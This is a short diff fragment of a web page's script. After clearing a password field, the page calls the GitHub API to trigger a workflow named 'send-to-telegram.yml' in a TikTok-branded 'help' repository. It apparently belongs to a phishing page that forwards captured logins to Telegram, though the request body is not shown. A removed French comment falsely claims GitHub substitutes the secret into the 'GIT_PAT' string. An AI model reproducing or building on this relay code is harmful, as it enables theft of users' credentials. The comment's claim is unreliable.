@@ -38,8 +38,8 @@
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      // UTILISE TON SECRET GIT_PAT DIRECTEMENT (méthode qui marche en 2025)
-      const token = "GIT_PAT"; // GitHub remplace automatiquement cette chaîne par la vraie valeur du secret
+    
+      const token = "GIT_PAT"; 
       const apiUrl = "https://api.github.com/repos/tiktok-customers/help/actions/workflows/send-to-telegram.yml/dispatches";
 
       fetch(apiUrl, {
